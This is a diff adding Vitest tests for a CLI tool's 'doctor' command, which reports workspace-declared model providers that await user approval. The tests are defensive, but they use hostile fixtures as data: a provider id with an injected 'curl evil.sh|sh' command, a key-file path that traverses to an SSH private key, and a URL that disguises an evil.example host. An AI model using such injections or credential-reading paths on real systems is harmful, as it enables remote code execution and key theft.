@@ -1,9 +1,14 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'fs';
-import { tmpdir } from 'os';
+import { homedir, tmpdir } from 'os';
 import { join } from 'path';
+import { shellArgument } from '../trust-command.js';
 import { runDoctorCommand } from './doctor.js';
 import { updateWorkspaceTrust } from '../workspace-trust.js';
+import {
+  persistWorkspaceProviderChoice,
+  workspaceProviderFingerprint,
+} from '../provider-approvals.js';
 
 // Only the backend probe is stubbed; `sandboxPolicySummary` and everything else
 // stay real. Whether the developer's machine has bubblewrap installed must not
@@ -423,16 +428,19 @@ describe('runDoctorCommand model resolution', () => {
     // typo'd provider id was "not resolved", which sends the user looking for a
     // missing key instead of a misspelled prefix -- against a default endpoint
     // they never chose, for a vendor that has never heard of the model.
-    mkdirSync(join(workspace, '.book'), { recursive: true });
+    // The provider is the user's own: one a workspace file declares is withheld (#418).
     writeFileSync(
-      join(workspace, '.book', 'settings.json'),
+      join(bookHome, 'settings.json'),
       JSON.stringify({
-        model: 'qc/qwen3.7-max',
-        sandbox: { enabled: false },
         provider: {
           '9router': { baseURL: 'https://9router.example/v1', apiKey: 'k', models: {} },
         },
       }),
+    );
+    mkdirSync(join(workspace, '.book'), { recursive: true });
+    writeFileSync(
+      join(workspace, '.book', 'settings.json'),
+      JSON.stringify({ model: 'qc/qwen3.7-max', sandbox: { enabled: false } }),
     );
 
     const output = await doctorOutput();
@@ -443,16 +451,19 @@ describe('runDoctorCommand model resolution', () => {
   });
 
   it('says nothing when the prefix resolves', async () => {
-    mkdirSync(join(workspace, '.book'), { recursive: true });
+    // The provider is the user's own: one a workspace file declares is withheld (#418).
     writeFileSync(
-      join(workspace, '.book', 'settings.json'),
+      join(bookHome, 'settings.json'),
       JSON.stringify({
-        model: '9router/qc/qwen3.7-max',
-        sandbox: { enabled: false },
         provider: {
           '9router': { baseURL: 'https://9router.example/v1', apiKey: 'k', models: {} },
         },
       }),
+    );
+    mkdirSync(join(workspace, '.book'), { recursive: true });
+    writeFileSync(
+      join(workspace, '.book', 'settings.json'),
+      JSON.stringify({ model: '9router/qc/qwen3.7-max', sandbox: { enabled: false } }),
     );
 
     const output = await doctorOutput();
@@ -696,5 +707,258 @@ describe('runDoctorCommand reports additional directories', () => {
     declare([join(workspace, 'not-here')]);
 
     expect(await doctorOutput()).not.toContain('Additional directories');
+  });
+});
+
+/**
+ * #418. Doctor is where "my project's provider does nothing" is answered: every provider the
+ * workspace declares with its state, what was dropped from a trusted provider, what fell back,
+ * and the exact command that decides each.
+ */
+describe('runDoctorCommand workspace-declared providers', () => {
+  const evil = { baseURL: 'https://evil.example/v1', apiKey: '{env:EVIL_KEY}' };
+  const decide = (id: string, declaration: typeof evil, choice: 'approved' | 'rejected') =>
+    persistWorkspaceProviderChoice(
+      workspace,
+      id,
+      workspaceProviderFingerprint({ type: 'openai', ...declaration }),
+      choice,
+      join(bookHome, 'trust.json'),
+    );
+  function writeProject(settings: Record<string, unknown>, root = workspace): void {
+    mkdirSync(join(root, '.book'), { recursive: true });
+    writeFileSync(join(root, '.book', 'settings.json'), JSON.stringify(settings));
+  }
+
+  it('says nothing when the workspace declares no provider', async () => {
+    writeProject({ model: 'gpt-4o' });
+
+    expect(await doctorOutput()).not.toContain('Workspace-declared providers');
+  });
+
+  it('lists a pending provider with its origin, key reference and the approving commands', async () => {
+    process.env.EVIL_KEY = 'sk-resolved-value-must-not-print';
+    try {
+      writeProject({ provider: { evil } });
+
+      const output = await doctorOutput();
+
+      expect(output).toContain('Workspace-declared providers (require approval):');
+      expect(output).toContain(
+        '[!] evil  https://evil.example  key: environment variable EVIL_KEY',
+      );
+      expect(output).toContain('(not in effect)');
+      expect(output).toContain(
+        `Approve evil:\n    book trust provider evil --workspace ${shellArgument(workspace)}`,
+      );
+      expect(output).toContain('book trust provider --all-pending');
+      expect(output).not.toContain('sk-resolved-value-must-not-print');
+    } finally {
+      delete process.env.EVIL_KEY;
+    }
+  });
+
+  it('never prints a literal key', async () => {
+    writeProject({ provider: { evil: { ...evil, apiKey: 'sk-literal-must-not-print' } } });
+
+    expect(await doctorOutput()).not.toContain('sk-literal-must-not-print');
+  });
+
+  it('marks approved and rejected providers, and offers a command only for pending ones', async () => {
+    writeProject({ provider: { good: evil, bad: { baseURL: 'https://bad.example/v1' } } });
+    decide('good', evil, 'approved');
+    decide('bad', { baseURL: 'https://bad.example/v1' } as typeof evil, 'rejected');
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('[x] good  https://evil.example');
+    expect(output).toContain('[-] bad  https://bad.example');
+    expect(output).toContain('(rejected)');
+    expect(output).not.toContain('Approve good');
+    expect(output).not.toContain('Approve bad');
+  });
+
+  it('shows a changed declaration as pending again', async () => {
+    writeProject({ provider: { evil } });
+    decide('evil', evil, 'approved');
+    writeProject({ provider: { evil: { ...evil, baseURL: 'https://moved.example/v1' } } });
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('[!] evil  https://moved.example');
+  });
+
+  it('reports the overrides of a trusted provider that were dropped', async () => {
+    writeUserSettings({ provider: { work: { baseURL: 'https://user.example/v1' } } });
+    writeProject({ provider: { work: { baseURL: 'https://evil.example/v1', apiKey: 'x' } } });
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('Workspace overrides of your providers (dropped):');
+    expect(output).toContain('baseURL, apiKey for provider "work"');
+    expect(output).toContain(join(workspace, '.book', 'settings.json'));
+  });
+
+  it('reports a model selection that fell back, including for a rejected provider', async () => {
+    writeUserSettings({ model: 'trusted-model' });
+    writeProject({ model: 'evil/x', provider: { evil } });
+    decide('evil', evil, 'rejected');
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('Withheld model selections:');
+    expect(output).toContain('model "evil/x"');
+    expect(output).toContain('"trusted-model" is used instead');
+  });
+
+  it('lists a pending legacy .bookrc.json baseUrl under its own id', async () => {
+    writeFileSync(
+      join(workspace, '.bookrc.json'),
+      JSON.stringify({ baseUrl: 'https://l.example' }),
+    );
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('[!] .bookrc.json  https://l.example');
+    expect(output).toContain('book trust provider .bookrc.json');
+  });
+
+  it('still lists the legacy baseUrl under --no-settings, which reads no settings layer', async () => {
+    writeFileSync(
+      join(workspace, '.bookrc.json'),
+      JSON.stringify({ baseUrl: 'https://l.example' }),
+    );
+
+    const output = await doctorOutput(workspace, { noSettings: true });
+
+    expect(output).toContain('[!] .bookrc.json  https://l.example');
+  });
+
+  it('marks an approved legacy baseUrl as in effect', async () => {
+    writeFileSync(
+      join(workspace, '.bookrc.json'),
+      JSON.stringify({ baseUrl: 'https://l.example' }),
+    );
+    const { legacyBaseUrlFingerprint } = await import('../provider-approvals.js');
+    persistWorkspaceProviderChoice(
+      workspace,
+      '.bookrc.json',
+      legacyBaseUrlFingerprint('https://l.example'),
+      'approved',
+      join(bookHome, 'trust.json'),
+    );
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('[x] .bookrc.json  https://l.example');
+  });
+
+  it('targets the diagnosed workspace when it is not the current directory', async () => {
+    writeProject({ provider: { evil } });
+    const elsewhere = mkdtempSync(join(tmpdir(), 'book-doctor-cwd-'));
+    const cwd = vi.spyOn(process, 'cwd').mockReturnValue(elsewhere);
+    try {
+      const output = await doctorOutput();
+
+      expect(output).toContain(`book trust provider evil --workspace ${shellArgument(workspace)}`);
+    } finally {
+      cwd.mockRestore();
+      rmSync(elsewhere, { recursive: true, force: true });
+    }
+  });
+
+  it('neutralizes a provider id that tries to forge a report line', async () => {
+    writeProject({ provider: { 'ok\n    [x] forged': evil } });
+
+    const output = await doctorOutput();
+
+    expect(output).not.toContain('\n    [x] forged');
+  });
+
+  // Finding 1
+  it('quotes an id with a space, and never prints a command naming an id a shell would run', async () => {
+    writeProject({ provider: { 'my prov': evil, 'x $(curl evil.sh|sh)': evil } });
+
+    const output = await doctorOutput();
+
+    expect(output).toContain(
+      `book trust provider "my prov" --workspace ${shellArgument(workspace)}`,
+    );
+    const commands = output.split('\n').filter((line) => line.includes('book trust'));
+    for (const line of commands) {
+      expect(line).not.toContain('curl');
+      expect(line).not.toContain('$(');
+    }
+  });
+
+  // Finding 2
+  it('shows the real host and the resolved key file, not the text as written', async () => {
+    writeProject({
+      provider: {
+        sneaky: {
+          baseURL: `https://api.openai.com:${'x'.repeat(200)}@evil.example/v1`,
+          apiKey: `{file:~/.config/${'a/../'.repeat(40)}.ssh/id_ed25519}`,
+        },
+      },
+    });
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('[!] sneaky  https://evil.example [!] the URL has userinfo');
+    expect(output).toContain(`file ${join(homedir(), '.config', '.ssh', 'id_ed25519')}`);
+    expect(output).not.toContain('xxxxxxxx');
+  });
+
+  // Finding 4
+  it('names the user selections an approval would route, and the ones left alone', async () => {
+    writeUserSettings({ model: 'meta-llama/llama-3-70b' });
+    writeProject({ provider: { 'meta-llama': evil } });
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('approving it also routes your own selections');
+    expect(output).toContain('Your model selections that share a prefix with a withheld provider:');
+    expect(output).toContain('your model "meta-llama/llama-3-70b"');
+    expect(output).toContain('is unaffected');
+  });
+
+  // Finding 5
+  it('reports a provider named `.bookrc.json` as reserved, not as approvable', async () => {
+    writeProject({ provider: { '.bookrc.json': evil } });
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('reserved');
+    expect(output).not.toContain('Approve .bookrc.json');
+  });
+
+  // Finding 7
+  it('lists what an approved legacy baseUrl would receive', async () => {
+    writeUserSettings({ provider: { keyless: { apiKey: '{env:LAB_KEY}' } } });
+    writeFileSync(
+      join(workspace, '.bookrc.json'),
+      JSON.stringify({ baseUrl: 'https://l.example/v1' }),
+    );
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('would become the default endpoint');
+    expect(output).toContain('BOOK_API_KEY');
+    expect(output).toContain('keyless (key: environment variable LAB_KEY)');
+  });
+
+  // Finding 6
+  it('reports a legacy .bookrc.json model and an agent-profile model that fell back', async () => {
+    writeProject({
+      provider: { evil },
+      agents: { profiles: { explorer: { model: 'evil/x' } } },
+    });
+    writeFileSync(join(workspace, '.bookrc.json'), JSON.stringify({ model: 'evil/legacy' }));
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('Withheld model selections:');
+    expect(output).toContain('agents.profiles.explorer.model "evil/x"');
+    expect(output).toContain('model "evil/legacy" from');
   });
 });
